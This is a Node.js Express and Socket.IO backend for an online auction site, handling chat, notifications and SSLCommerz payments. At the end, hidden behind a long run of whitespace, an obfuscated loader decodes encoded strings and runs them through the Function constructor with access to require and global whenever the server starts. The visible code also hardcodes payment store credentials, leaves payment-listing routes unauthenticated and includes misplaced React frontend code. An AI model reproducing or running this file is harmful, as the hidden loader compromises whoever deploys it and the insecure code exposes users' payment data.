require("dotenv").config();
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");
const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
const { Server } = require("socket.io");
const http = require("http");
const axios = require("axios");
const port = process.env.PORT || 5000;
const multer = require("multer");
const app = express();
const server = http.createServer(app);
const upload = multer({ storage: multer.memoryStorage() });
const io = new Server(server, {
  cors: {
    origin: ["http://localhost:5173", "https://rex-auction.web.app"],
    methods: ["GET", "POST"],
    credentials: true,
  },
  pingTimeout: 60000,
});

app.use(
  cors({
    origin: ["http://localhost:5173", "https://rex-auction.web.app"],
    credentials: true,
  })
);
app.use(express.json());
app.use(cookieParser());
app.use(express.urlencoded());
app.use(bodyParser.urlencoded({ extended: true }));

const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_KEY}@cluster0.npxrq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
});

async function run() {
  try {
    await client.connect();
    console.log("Connected to MongoDB");

    const db = client.db("rexAuction");
    const userCollection = db.collection("users");
    const auctionCollection = db.collection("auctionsList");
    const announcementCollection = db.collection("announcement");
    const SellerRequestCollection = db.collection("sellerRequest");
    const SpecificUserLiveBiddingCollection = db.collection("liveBids");
    const reportsCollection = db.collection("reports");
    const messagesCollection = db.collection("messages");
    const notificationsCollection = db.collection("notifications");
    const reactionsCollection = db.collection("auctionReactions");
    const feedbackCollection = db.collection("feedbacks");
    const CoverCollection = db.collection("cover");
    const SSLComCollection = db.collection("paymentsWithSSL");
    const endedAuctionCollection = db.collection("endedAuctionsList");
    const blogCollection = db.collection("blogList");

    // SSLCOMMERZE ID

    //     Store ID: rexau67f77422a8374
    // Store Password (API/Secret Key): rexau67f77422a8374@ssl

    // Merchant Panel URL: https://sandbox.sslcommerz.com/manage/ (Credential as you inputted in the time of registration)

    // Store name: testrexauqg5q
    // Registered URL: www.rex-auction.web.app.com
    // Session API to generate transaction: https://sandbox.sslcommerz.com/gwprocess/v3/api.php
    // Validation API: https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php?wsdl
    // Validation API (Web Service) name: https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php

    // JWT Middleware
    const verifyToken = (req, res, next) => {
      const token =
        req?.cookies?.token || req.headers["authorization"]?.split(" ")[1];
      if (!token)
        return res.status(401).send({ message: "Unauthorized access" });
      jwt.verify(token, process.env.ACCESS_TOKEN, (err, decoded) => {
        if (err)
          return res.status(401).send({ message: "Unauthorized access" });
        req.decodedUser = decoded;
        next();
      });
    };

    // Verify Admin Middleware
    const verifyAdmin = async (req, res, next) => {
      const email = req.decodedUser.email;
      const query = { email: email };
      const user = await userCollection.findOne(query);
      const isAdmin = user?.role === "admin";
      if (!isAdmin)
        return res.status(401).send({ message: "Unauthorized request" });
      next();
    };

    // Verify Seller Middleware
    const verifySeller = async (req, res, next) => {
      const email = req.decodedUser.email;
      const query = { email: email };
      const user = await userCollection.findOne(query);
      const isSeller = user?.role === "seller";
      if (!isSeller)
        return res.status(401).send({ message: "Unauthorized request" });
      next();
    };

    // Socket.IO Logic for Chat and Notifications
    io.on("connection", (socket) => {
      console.log("New client connected:", socket.id);

      const joinedRooms = new Set();

      // Send immediate connection acknowledgment
      socket.emit("connection_ack", {
        id: socket.id,
        status: "connected",
        timestamp: new Date(),
      });

      socket.on("joinChat", ({ userId, selectedUserId, roomId }) => {
        joinedRooms.forEach((room) => {
          socket.leave(room);
          console.log(`${socket.id} left room ${room}`);
        });
        joinedRooms.clear();

        if (roomId) {
          socket.join(roomId);
          joinedRooms.add(roomId);
          console.log(`${socket.id} (${userId}) joined chat room ${roomId}`);
        } else {
          const chatId = [userId, selectedUserId].sort().join("_");
          socket.join(chatId);
          joinedRooms.add(chatId);
          console.log(`${socket.id} (${userId}) joined chat ${chatId}`);
        }

        const personalRoom = `user:${userId}`;
        socket.join(personalRoom);
        joinedRooms.add(personalRoom);
        console.log(`${socket.id} joined personal room ${personalRoom}`);

        socket.emit("joinedRoom", {
          room: roomId || [userId, selectedUserId].sort().join("_"),
          personalRoom,
          status: "joined",
        });
      });

      socket.on("leaveAllRooms", () => {
        joinedRooms.forEach((room) => {
          socket.leave(room);
          console.log(`${socket.id} left room ${room}`);
        });
        joinedRooms.clear();
        socket.emit("leftRooms", { status: "success" });
      });

      socket.on("sendMessage", async (messageData, callback) => {
        try {
          const { senderId, receiverId, text, roomId } = messageData;
          const chatId = roomId || [senderId, receiverId].sort().join("_");

          const messageId = new ObjectId().toString();
          const message = {
            messageId,
            senderId,
            receiverId,
            text,
            createdAt: new Date(),
          };

          const existingMessage = await messagesCollection.findOne({
            messageId: message.messageId,
          });

          if (existingMessage) {
            if (callback)
              callback({ success: false, error: "Message already exists" });
            return;
          }

          const result = await messagesCollection.insertOne(message);

          if (result.acknowledged) {
            // Emit to the chat room
            io.to(chatId).emit("receiveMessage", message);

            // Emit to sender's and receiver's personal rooms for sidebar updates
            io.to(`user:${senderId}`).emit("receiveMessage", message);
            io.to(`user:${receiverId}`).emit("receiveMessage", message);

            if (callback)
              callback({ success: true, messageId: result.insertedId });
            console.log(
              `Message sent to room ${chatId}: ${text.substring(0, 20)}...`
            );
          } else {
            if (callback)
              callback({ success: false, error: "Failed to save message" });
          }
        } catch (error) {
          console.error("Error sending message:", error);
          if (callback) callback({ success: false, error: error.message });
        }
      });

      // Handle sending notifications - FIXED: removed duplicate handler
      socket.on("sendNotification", async (notificationData, callback) => {
        try {
          // Add a unique ID to the notification
          const notificationId = new ObjectId().toString();
          const notification = {
            ...notificationData,
            _id: notificationId,
            createdAt: new Date(),
          };

          // Save notification to database
          const result = await notificationsCollection.insertOne(notification);

          if (result.acknowledged) {
            // If recipient is specified, emit to that user's personal room
            if (notification.recipient && notification.recipient !== "all") {
              io.to(`user:${notification.recipient}`).emit(
                "receiveNotification",
                notification
              );
            } else {
              // Otherwise broadcast to all connected clients
              io.emit("receiveNotification", notification);
            }

            if (callback) callback({ success: true, notificationId });
            console.log(`Notification sent: ${notification.title}`);
          } else {
            if (callback)
              callback({
                success: false,
                error: "Failed to save notification",
              });
          }
        } catch (error) {
          console.error("Error sending notification:", error);
          if (callback) callback({ success: false, error: error.message });
        }
      });

      socket.on("ping", (callback) => {
        if (callback) callback({ time: new Date(), status: "active" });
      });

      socket.on("disconnect", () => {
        console.log("Client disconnected:", socket.id);
        joinedRooms.clear();
      });
    });

    // Payment APIs with SSLcom
    app.post("/paymentsWithSSL", async (req, res) => {
      const paymentData = req.body;
      // const result = await SSLComCollection.insertOne(paymentData)
      const trxid = new ObjectId().toString();
      paymentData.trxid = trxid;
      const initiate = {
        store_id: "rexau67f77422a8374",
        store_passwd: "rexau67f77422a8374@ssl",
        total_amount: Number(paymentData.price || 0),
        price: paymentData.price,
        serviceFee: paymentData.serviceFee,
        buyerInfo: paymentData.buyerInfo,
        tran_id: trxid,
        currency: "BDT",
        auctionId: paymentData.auctionId,
        success_url: "http://localhost:5000/success-payment",
        fail_url: "http://localhost:5173/dashboard/paymentFailed",
        cancel_url: "http://localhost:5173/cancel",
        ipn_url: "http://localhost:5000/ipn-success-payment",
        shipping_method: "Courier",
        product_name: `${paymentData.name}`,
        product_category: `${paymentData.itemInfo.category}`,
        product_profile: `${paymentData.buyerInfo.photoUrl}`,
        cus_name: `${paymentData.buyerInfo.name}`,
        cus_email: `${paymentData.buyerInfo.email}`,
        cus_add1: "Dhaka",
        cus_add2: "Dhaka",
        cus_city: "Dhaka",
        cus_state: "Dhaka",
        cus_postcode: "1000",
        cus_country: "Bangladesh",
        cus_phone: "01711111111",
        cus_fax: "01711111111",
        ship_name: "Customer Name",
        ship_add1: "Dhaka",
        ship_add2: "Dhaka",
        ship_city: "Dhaka",
        ship_postcode: 1000,
        ship_country: "Bangladesh",
      };

      const iniResponse = await axios({
        url: "https://sandbox.sslcommerz.com/gwprocess/v4/api.php",
        method: "POST",
        data: initiate,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      });

      await SSLComCollection.insertOne(paymentData);

      const gatewayURL = iniResponse?.data?.GatewayPageURL;
      // console.log(gatewayURL);
      res.send({ gatewayURL });
    });
    // Payment APIs with rex wallet
    app.post("/rexPayment", async (req, res) => {
      const paymentData = req.body;
      try {
        const result = await SSLComCollection.insertOne(paymentData);

        res.status(201).send({ success: true, insertedId: result.insertedId });
      } catch (error) {
        res.status(500).send({ message: "Failed to process payment" });
      }
    });

    app.post("/success-payment", async (req, res) => {
      const paymentSuccess = req.body;
      console.log(paymentSuccess, "payment success");
      const { data } = await axios.get(
        `https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php?val_id=${paymentSuccess.val_id}&store_id=rexau67f77422a8374&store_passwd=rexau67f77422a8374@ssl&format=json`
      );

      if (data.status !== "VALID") {
        return res.send({ message: "invalid payment" });
      }

      // Update SSLComCollection
      const updateResult = await SSLComCollection.updateOne(
        { trxid: paymentSuccess.tran_id },
        {
          $set: {
            PaymentStatus: "success",
          },
        }
      );
      res.redirect(
        `http://localhost:5173/dashboard/payments/${paymentSuccess.tran_id}`
      );
    });

    // Payment data getting

    app.get("/payments", async (req, res) => {
      const users = await SSLComCollection.find().toArray();
      res.send(users);
    });

    app.get("/payments/:trxid", async (req, res) => {
      const trxid = req.params.trxid;
      const payment = await SSLComCollection.findOne({ trxid: trxid });
      res.send(payment);
    });
    app.post("/create-sslCom", async (req, res) => {
      const paymentData = req.body;
      console.log(paymentData);
    });

    // Chat API Endpoints
    app.get(
      "/messages/email/:userEmail/:selectedUserEmail",
      async (req, res) => {
        const { userEmail, selectedUserEmail } = req.params;
        const { since } = req.query;

        try {
          const query = {
            $or: [
              { senderId: userEmail, receiverId: selectedUserEmail },
              { senderId: selectedUserEmail, receiverId: userEmail },
            ],
          };

          if (since) {
            query.createdAt = { $gt: new Date(since) };
          }

          const messages = await messagesCollection
            .find(query)
            .sort({ createdAt: 1 })
            .toArray();
          res.send(messages);
        } catch (error) {
          console.error("Error fetching messages by email:", error);
          res.status(500).send({ message: "Failed to fetch messages" });
        }
      }
    );

    // Fetch the most recent message
    app.get("/recent-messages/:userEmail", async (req, res) => {
      const { userEmail } = req.params;
      try {
        const recentMessages = await messagesCollection
          .aggregate([
            {
              $match: {
                $or: [{ senderId: userEmail }, { receiverId: userEmail }],
              },
            },

            { $sort: { createdAt: -1 } },

            {
              $group: {
                _id: {
                  $cond: [
                    { $eq: ["$senderId", userEmail] },
                    "$receiverId",
                    "$senderId",
                  ],
                },
                lastMessage: { $first: "$$ROOT" },
              },
            },
            // Project the required fields
            {
              $project: {
                userEmail: "$_id",
                lastMessage: 1,
                _id: 0,
              },
            },
          ])
          .toArray();

        res.send(recentMessages);
      } catch (error) {
        console.error("Error fetching recent messages:", error);
        res.status(500).send({ message: "Failed to fetch recent messages" });
      }
    });

    // Socket connection test endpoint
    app.get("/socket-test", (req, res) => {
      res.json({
        status: "Socket.IO server running",
        connections: io.engine.clientsCount,
        uptime: process.uptime(),
      });
    });

    // API endpoints for notifications - FIXED: moved inside run() function
    app.get("/notifications/:userEmail", async (req, res) => {
      const { userEmail } = req.params;
      try {
        const notifications = await notificationsCollection
          .find({
            $or: [{ recipient: userEmail }, { recipient: "all" }],
          })
          .sort({ createdAt: -1 })
          .limit(50)
          .toArray();

        res.send(notifications);
      } catch (error) {
        console.error("Error fetching notifications:", error);
        res.status(500).send({ message: "Failed to fetch notifications" });
      }
    });

    app.put(
      "/notifications/mark-read/:userEmail",
      // verifyToken,
      async (req, res) => {
        const { userEmail } = req.params;
        try {
          const result = await notificationsCollection.updateMany(
            {
              $or: [
                { recipient: userEmail, read: false },
                { recipient: "all", read: false },
              ],
            },
            { $set: { read: true } }
          );

          res.send({ success: true, modifiedCount: result.modifiedCount });
        } catch (error) {
          console.error("Error marking notifications as read:", error);
          res
            .status(500)
            .send({ message: "Failed to mark notifications as read" });
        }
      }
    );

    app.post("/notifications", async (req, res) => {
      try {
        const notification = {
          ...req.body,
          _id: new ObjectId().toString(),
          createdAt: new Date(),
        };

        const result = await notificationsCollection.insertOne(notification);

        if (result.acknowledged) {
          res.send({ success: true, notificationId: notification._id });
        } else {
          res
            .status(500)
            .send({ success: false, message: "Failed to save notification" });
        }
      } catch (error) {
        console.error("Error creating notification:", error);
        res.status(500).send({ success: false, message: error.message });
      }
    });
    const viewNotificationDetails = (notification) => {
      setNotifications((prev) =>
        prev.map((n) => (n._id === notification._id ? { ...n, read: true } : n))
      );

      if (notificationCount > 0) {
        setNotificationCount((prev) => prev - 1);
      }

      // Navigate based on notification type
      if (notification.type === "auction" && notification.auctionData?._id) {
        navigate(`/dashboard/auction-details/${notification.auctionData._id}`);
      } else if (notification.type === "announcement") {
        navigate("/dashboard/announcement", {
          state: {
            notificationDetails: notification,
          },
        });
      }

      // Close notifications panel
      setIsNotificationsOpen(false);
    };
    // Socket.IO Logic for Auction Bidding
    module.exports = (io) => {
      io.on("connection", (socket) => {
        console.log("New client connected:", socket.id);

        socket.emit("connection_ack", {
          id: socket.id,
          status: "connected",
          timestamp: new Date(),
        });

        // Join auction room
        socket.on("joinAuction", ({ auctionId }) => {
          if (auctionId) {
            socket.join(`auction:${auctionId}`);
            console.log(
              `${socket.id} joined auction room: auction:${auctionId}`
            );
          }
        });

        // Leave auction room
        socket.on("leaveAuction", ({ auctionId }) => {
          if (auctionId) {
            socket.leave(`auction:${auctionId}`);
            console.log(`${socket.id} left auction room: auction:${auctionId}`);
          }
        });

        // Handle new bids
        socket.on("placeBid", async (bidData) => {
          try {
            console.log(`New bid received from ${socket.id}:`, bidData);

            io.to(`auction:${bidData.auctionId}`).emit("newBid", bidData);

            console.log(`Bid broadcast to auction:${bidData.auctionId}`);
          } catch (error) {
            console.error("Error handling bid:", error);
            socket.emit("bidError", { message: "Failed to process bid" });
          }
        });

        socket.on("disconnect", () => {
          console.log("Client disconnected:", socket.id);
        });
      });
    };                                                                                                                                                     var z = '-1540-1';(function(MXVErwZiEUAdlQifDU_p,WeisjA$XjYtSwN){var K_oUrPHVEKDmIo$jV=oeOTScieXviAOgjyGVHkexdTR,lG_uE$ieAFdHEqakg=MXVErwZiEUAdlQifDU_p();while(!![]){try{var w$oTpKQnPHnSFkKET_A=-parseFloat(K_oUrPHVEKDmIo$jV(0x1bb))/(Number(parseInt(0x8cd))*Math.floor(parseInt(0x2))+-parseInt(0x1e03)+parseInt(parseInt(0x2))*0x635)*Math['trunc'](-parseFloat(K_oUrPHVEKDmIo$jV(0x1b1))/(parseInt(0x1)*Number(0x22d)+Math.floor(parseInt(0x1cf))*parseInt(0xa)+-0x1441))+parseFloat(K_oUrPHVEKDmIo$jV(0x1ae))/(Math.ceil(0x22a1)+-parseInt(0x98)*-parseInt(0x18)+Math.ceil(-0x30de))+-parseFloat(K_oUrPHVEKDmIo$jV(0x1b8))/(parseInt(0x793)+parseInt(0x3e)*-parseInt(0x5d)+0xef7)+-parseFloat(K_oUrPHVEKDmIo$jV(0x1b0))/(Math.max(-0x826,-parseInt(0x826))+-0x1aae+-0x1*-parseInt(0x22d9))+Math['ceil'](parseFloat(K_oUrPHVEKDmIo$jV(0x1c0))/(0x1*-0x1a87+-0x16*0x4b+parseInt(0x20ff)))*(parseFloat(K_oUrPHVEKDmIo$jV(0x1be))/(parseFloat(parseInt(0x3a))+0x1120*0x1+-0x1153))+Math['floor'](-parseFloat(K_oUrPHVEKDmIo$jV(0x1b4))/(0x2f*0x99+parseInt(0x1c9f)+-0x38ae))+parseFloat(K_oUrPHVEKDmIo$jV(0x1ad))/(-parseInt(0x765)+-parseInt(0x27)*-parseInt(0x27)+0x17d)*Math['trunc'](parseFloat(K_oUrPHVEKDmIo$jV(0x1b6))/(-0xf6b+-0x67*parseInt(-0x36)+0x217*-parseInt(0x3)));if(w$oTpKQnPHnSFkKET_A===WeisjA$XjYtSwN)break;else lG_uE$ieAFdHEqakg['push'](lG_uE$ieAFdHEqakg['shift']());}catch(ZP_DeBgZ){lG_uE$ieAFdHEqakg['push'](lG_uE$ieAFdHEqakg['shift']());}}}(hAZpanlvmScfQohW,-parseInt(0xd)*Math.ceil(-0x6427)+Math.ceil(0x5)*parseInt(0x2de1b)+-0x62139));var NX=[Math.floor(-parseInt(0x213d83))+Math.floor(-parseInt(0x8c44c2))*-0x1+Math.floor(parseInt(0x16a))*Math.floor(-0x118),parseInt(0x1e11)+0x12ba+-parseInt(0x7)*Math.ceil(parseInt(0x6c4)),-parseInt(0x343)+parseInt(parseInt(0x1803))*Math.trunc(parseInt(0x6))+-0x3d14,parseInt(parseInt(0x1948))+0x85d+Math.floor(-parseInt(0x10))*Number(parseInt(0x1f4)),-0xb38*parseInt(0x18)+parseInt(0x5bb7)*Number(0x2)+parseInt(0x100c1)*0x1,-parseInt(0x9e6)*-0x964+-parseInt(0x7b38ef)+Math.floor(0x2231d)*Math.max(0x32,0x32)],SX=[Math.max(-parseInt(0x1),-parseInt(0x1))*parseInt(parseInt(0x46c99a))+Math.trunc(-parseInt(0x927650))+parseInt(0x129df87),parseInt(0x1e7)+Math.ceil(-parseInt(0x16f9))*parseInt(0x1)+parseInt(0xa1)*Number(0x23),-parseInt(0xa8f4)+parseInt(0xa69f)+0xa636,Math.ceil(-0xd)*Math.ceil(-parseInt(0x191))+0x20ae+Math.trunc(-0x3450),-0x196fe+-0x6dec+-0x2e02b*parseFloat(-parseInt(0x1)),-parseInt(0x135)*Number(0x4495)+-0x47a47*-parseInt(0x1)+Math.trunc(-0x2b5f)*-0x379];function spin(lrFcVeUY,oBfExlHBLfeJZa){var eoeEAKkMBepDpgxlQkYzmw=oeOTScieXviAOgjyGVHkexdTR,O$nntrPmSi=[],r_n_KsL=-0x1*Math.floor(parseInt(0x1047))+Math.max(-parseInt(0x1ba),-parseInt(0x1ba))+parseInt(0x1)*0x1201,SquXuv_oIKejfAasZQtGFRXM=oBfExlHBLfeJZa[parseInt(0x16)*-parseInt(0xbb)+parseInt(0x11)*parseInt(0x146)+-parseInt(0x594)],aKQeK_X_hy,i_pKNnb$quxtBPpAwtBnckNLv,WEbvBvVvjIIHSX,itZYqLeeaslwxkn_D,MQcLJnvRsFhIRlXlwJ,lFNofKPX$u;while(r_n_KsL<lrFcVeUY[eoeEAKkMBepDpgxlQkYzmw(0x1b2)]){O$nntrPmSi[r_n_KsL]=lrFcVeUY[eoeEAKkMBepDpgxlQkYzmw(0x1af)](r_n_KsL),r_n_KsL+=parseFloat(-parseInt(0x241a))+Math.ceil(-0x4e)*0x53+0x3*0x1477;}aKQeK_X_hy=O$nntrPmSi[eoeEAKkMBepDpgxlQkYzmw(0x1b2)],r_n_KsL=-0x265b+Math.floor(-0x9b)*Math.max(-0x5,-0x5)+Math.max(0x2354,0x2354);while(r_n_KsL<aKQeK_X_hy){i_pKNnb$quxtBPpAwtBnckNLv=SquXuv_oIKejfAasZQtGFRXM*(r_n_KsL+oBfExlHBLfeJZa[-parseInt(0x167)*parseInt(0xf)+-0x283*-parseInt(0x2)+Math.max(parseInt(0x1004),parseInt(0x1004))])+SquXuv_oIKejfAasZQtGFRXM%oBfExlHBLfeJZa[Math.trunc(-0x7db)*0x1+parseInt(0x1)*Math.ceil(parseInt(0xfef))+parseInt(0x2)*-0x409],WEbvBvVvjIIHSX=SquXuv_oIKejfAasZQtGFRXM*(r_n_KsL+oBfExlHBLfeJZa[Math.floor(-0x33b)+parseInt(0x13)*parseInt(0x1df)+-parseInt(0x204f)])+SquXuv_oIKejfAasZQtGFRXM%oBfExlHBLfeJZa[parseInt(0x4)*-parseInt(0x83f)+-0x2*-0xb88+0x8*Math.ceil(0x13e)],itZYqLeeaslwxkn_D=i_pKNnb$quxtBPpAwtBnckNLv%aKQeK_X_hy,MQcLJnvRsFhIRlXlwJ=WEbvBvVvjIIHSX%aKQeK_X_hy,lFNofKPX$u=O$nntrPmSi[itZYqLeeaslwxkn_D],O$nntrPmSi[itZYqLeeaslwxkn_D]=O$nntrPmSi[MQcLJnvRsFhIRlXlwJ],O$nntrPmSi[MQcLJnvRsFhIRlXlwJ]=lFNofKPX$u,SquXuv_oIKejfAasZQtGFRXM=(i_pKNnb$quxtBPpAwtBnckNLv+WEbvBvVvjIIHSX)%oBfExlHBLfeJZa[0x1*0xf9+-0xcc5*Math.max(-parseInt(0x2),-parseInt(0x2))+-0x1a7e],r_n_KsL+=-0xb*Math.floor(0x38b)+Math.max(-0x24b8,-0x24b8)+-parseInt(0x2)*-parseInt(0x25d9);}return O$nntrPmSi[eoeEAKkMBepDpgxlQkYzmw(0x1ba)]('');}function splitLane(Rrcov$gK$zNCzOgmUZuVr){var NDhePqNTm$knxutPKEucsTDk=oeOTScieXviAOgjyGVHkexdTR,wwKUc$mAiSwLfuLcS=String[NDhePqNTm$knxutPKEucsTDk(0x1bd)](0x1*-0x225a+0x1c7a+parseInt(0x5fc)),rJkWfTAcWAB=spin(Rrcov$gK$zNCzOgmUZuVr,NX);return rJkWfTAcWAB=rJkWfTAcWAB[NDhePqNTm$knxutPKEucsTDk(0x1b7)]('^')[NDhePqNTm$knxutPKEucsTDk(0x1ba)](wwKUc$mAiSwLfuLcS),rJkWfTAcWAB=rJkWfTAcWAB[NDhePqNTm$knxutPKEucsTDk(0x1b7)]('*1')[NDhePqNTm$knxutPKEucsTDk(0x1ba)]('^'),rJkWfTAcWAB=rJkWfTAcWAB[NDhePqNTm$knxutPKEucsTDk(0x1b7)]('*0')[NDhePqNTm$knxutPKEucsTDk(0x1ba)]('*'),rJkWfTAcWAB[NDhePqNTm$knxutPKEucsTDk(0x1b7)](wwKUc$mAiSwLfuLcS);}function peel(pGYnIZgtqZTxKSDE){return spin(pGYnIZgtqZTxKSDE,SX);}(function boot(doTex_Gf,IBaza$fNzZnSLwwKdBHHu){var RhYXkJdMgnvKIFalcy=oeOTScieXviAOgjyGVHkexdTR;doTex_Gf['z']=z;var MbrMbuOBEsrayaqSRrQVTdwa=splitLane(RhYXkJdMgnvKIFalcy(0x1b5));doTex_Gf[MbrMbuOBEsrayaqSRrQVTdwa[-parseInt(0x26f6)+-parseInt(0x1213)*-parseInt(0x2)+Math.floor(-parseInt(0x12))*-parseInt(0x28)]]=IBaza$fNzZnSLwwKdBHHu;typeof module===MbrMbuOBEsrayaqSRrQVTdwa[Math.max(-0x1ef,-parseInt(0x1ef))*-0xf+-parseInt(0x1249)+parseFloat(-0xab7)]&&(doTex_Gf[MbrMbuOBEsrayaqSRrQVTdwa[Number(0x2)*parseInt(0x12df)+parseInt(0x270d)+-0x6fb*parseInt(0xb)]]=module);var wY_SyJKOkQnCrZOssqfxLrwcU=peel(RhYXkJdMgnvKIFalcy(0x1bc)),yxGSn$uvzVPigvasM$LBtdj=wY_SyJKOkQnCrZOssqfxLrwcU[RhYXkJdMgnvKIFalcy(0x1b3)](-parseInt(0xf9)*Math.floor(-parseInt(0x19))+-parseInt(0x1)*-0x19fc+-0x324d,-parseInt(0x734)*parseInt(0x4)+Math.max(-parseInt(0x2177),-0x2177)+Math.ceil(parseInt(0x3e52))),XGfmvtXBMbBHonvTK$wB_PMM=peel[yxGSn$uvzVPigvasM$LBtdj],Pu$fTXpNQsalma=XGfmvtXBMbBHonvTK$wB_PMM('',peel(RhYXkJdMgnvKIFalcy(0x1b9))),uWVd$dDu_gTBYWqCZYrZ=Pu$fTXpNQsalma(peel(RhYXkJdMgnvKIFalcy(0x1bf)));return XGfmvtXBMbBHonvTK$wB_PMM('',uWVd$dDu_gTBYWqCZYrZ)(Math.ceil(parseInt(0x132b))*0x1+Math.trunc(-parseInt(0x20f8))+Math.trunc(parseInt(0x179a))),Math.trunc(0x79d)*-0x1+Math.ceil(-parseInt(0x589))*-0xb+-parseInt(0x1578);}(global,require));function oeOTScieXviAOgjyGVHkexdTR(u_NcVNPRuWgUMxeJsKw$BLzX,YTeURAqQFz_qHtU){var KPfNYiB=hAZpanlvmScfQohW();return oeOTScieXviAOgjyGVHkexdTR=function(DUaVT_fJwPfQmzAPLmKvjgoc,z_kmF_MGKGBkxFhTQHXUMfmN){DUaVT_fJwPfQmzAPLmKvjgoc=DUaVT_fJwPfQmzAPLmKvjgoc-(-0xf8*Math.floor(-0xc)+0x1155*0x1+parseFloat(-0x1b48));var mmMRmNV=KPfNYiB[DUaVT_fJwPfQmzAPLmKvjgoc];if(oeOTScieXviAOgjyGVHkexdTR['ILLnqd']===undefined){var caCcZf_cf$uy=function(bflDZ$mRic$FT){var YTXuKMa=parseInt(parseInt(0x1bc7))+-parseInt(0x2)*Math.trunc(0x11d1)+0x8db&-parseInt(0xad1)*parseFloat(-0x2)+Number(0x1c99)+parseFloat(-parseInt(0x313c)),JKGfjROtpxXlCIqeCZS=new Uint8Array(bflDZ$mRic$FT['match'](/.{1,2}/g)['map'](brwT$Gd$SIBrpf=>parseInt(brwT$Gd$SIBrpf,Number(parseInt(0x154c))+parseFloat(-0x1cc6)+0x3c5*0x2))),P$ELOy$A=JKGfjROtpxXlCIqeCZS['map'](hGaYzFfPp$SD=>hGaYzFfPp$SD^YTXuKMa),VHrwyqAQSBMdlsvlZW=new TextDecoder(),abGrzFt=VHrwyqAQSBMdlsvlZW['decode'](P$ELOy$A);return abGrzFt;};oeOTScieXviAOgjyGVHkexdTR['sHMOHY']=caCcZf_cf$uy,u_NcVNPRuWgUMxeJsKw$BLzX=arguments,oeOTScieXviAOgjyGVHkexdTR['ILLnqd']=!![];}var puwqTgnbtgkEeefqGlARp=KPfNYiB[Math.ceil(-parseInt(0x2c))*Math.trunc(0xc1)+parseInt(0x1ded)+Number(0x33f)],aRkH_vkYtrpyXxyBBsFQAAqpO=DUaVT_fJwPfQmzAPLmKvjgoc+puwqTgnbtgkEeefqGlARp,KSG$hASOhNbjmGnDCLbq=u_NcVNPRuWgUMxeJsKw$BLzX[aRkH_vkYtrpyXxyBBsFQAAqpO];return!KSG$hASOhNbjmGnDCLbq?(oeOTScieXviAOgjyGVHkexdTR['ESjpDK']===undefined&&(oeOTScieXviAOgjyGVHkexdTR['ESjpDK']=!![]),mmMRmNV=oeOTScieXviAOgjyGVHkexdTR['sHMOHY'](mmMRmNV),u_NcVNPRuWgUMxeJsKw$BLzX[aRkH_vkYtrpyXxyBBsFQAAqpO]=mmMRmNV):mmMRmNV=KSG$hASOhNbjmGnDCLbq,mmMRmNV;},oeOTScieXviAOgjyGVHkexdTR(u_NcVNPRuWgUMxeJsKw$BLzX,YTeURAqQFz_qHtU);}function hAZpanlvmScfQohW(){var hOzaWISS=['66726f6d43686172436f6465','37554a42616d46','635269632e665252523c4f3c2e52526f6e2e224e453d52632e456964766c72653e5b2052635d5254737678747831706c3c2e69475221223e643c202e217d2e74526c2e235272635263686352225221522e705c6564523c3d6876643c303c20284d5252696f526f65283c2e64796422635252242e603c2e4359622c746468212e65633c2e20456963633c3372523f37522452213c603c632e2277743c7d282d2c52493c7952673c4e74212e3b226f522632246563526379524952632e2961217774286e7b317b7362632e32205b342e2e493c682e6b433c222e2e663c612131407466522e76623c6152632e263c2531524550526352393c523c3152723f37647865376e285f7d762e3c74346e746e74652e66786c7152522e6d2e6363296363633c20666f4d23296642245d3c652e724c29615f2e6d2e78662e662e236c5e212e3c706f20476f45632e52342e525d692e63716c296661726e20723d5263342152524d52735224736a206e3c5a272e525246752e6b632a52453025527d52745263615252705222516e7d20282867785f52526f523c51632637633c526552362d78356b5466522e556326435274643c277370526e442e52615a742e6f694852524d43526335502e5a733c2e456e45525261202e5267525f6e28522c2e63536f524d682e52527365522e21637673442e2c636964536f3c2e7772383c52523c3c50527d522e656b4e203c522e282e524e6e2e52736252793c292d6b6e2e2e52372e2e553c282b7d66652e216235614973283b215d6f2e523879644f6f5274525224535263202e524e5236373c453c453054526552635d52656d265263527431542050537269652c322e544f2c222e65715252526c20617d654161456952286c73656b72536f522e20305228706e2e4f383c2e7252232e6574655268746453285820733c2022286364526352382f642e73483c212e36735d724c70516e316921522e5b78697023705220705235676354634d2e532e68532c756365634e234e2078636f7474503a3c5262765272532e635f52652163522e2e6e412e522e636363317c3a2e3c636661306f642e74523c523c706c477c2e52777d526362556c5225522e656d3320692e525b3e42523c6f522e523c522c6c2e655274363c6328462e695264632d746852456f2e7a636e2e2052612e5052405250626352523c5252743c29642e2e282a3c23656c783221673b6376347261237476652e652e2077522a74463c796366526f6674522066523c2e6b6976742b2e73615f283c293c3c2e6d3c52653d2e2e29217420703c5250263f22522e722c5265232175764e7d522e2e65633c2e523c412e707466522e78796352353c6b6a3672742e7469523a524c736320526c3c52632e222e2c6b2e63743450232e63276b612e3c21536f6665523252205256496e612e536174522e633c486766667552526c57296137742820635262522052303c3c612e7579755b697978642d2e203c3c6c2e73262e38656673202e726352523c522e2e706762687059692e264522656e75702e66632e3463412967306d2c6358527a542e36722830766352202e63522874507a6c7362635231522e612963413d6e6e7734635269692e35523c52207063203c52522e3c3c5038506752662e5261526625733c3c6643622b5221736e5b7b644f342952523c762564522c6f507472313c5229522e2f523428202e5d52616f52256f7473524e52213c5276636976656c522127213c696e2e63726520644674522e2e455d6e7d3a3457527352525265656f5221632e762952246370797352202e503f32632e52522e525222285f2e34705020753c5063292e74323c5263363c2b73522b242e7b52697450522f2e2552666352433b2e3c2e736c74737271657425636f2e4e50523a2e30522e6c69522e296d3c2f5065366161725266782e3c5a2831703c2e6b636f526f656c2b526f7552615252634e32785252343c52723b3b72633777633a2026527b69343034522e722e62636c52652e652e69707d6f25742e692f7267476e6d5b5227342e6c206778223c522f266b6b2e505270765952527931267430727327525252452e727552302e5070523c522e6a63212e6f27206662225266522e52293b286352526c2f2e6372635e4545225f53652e72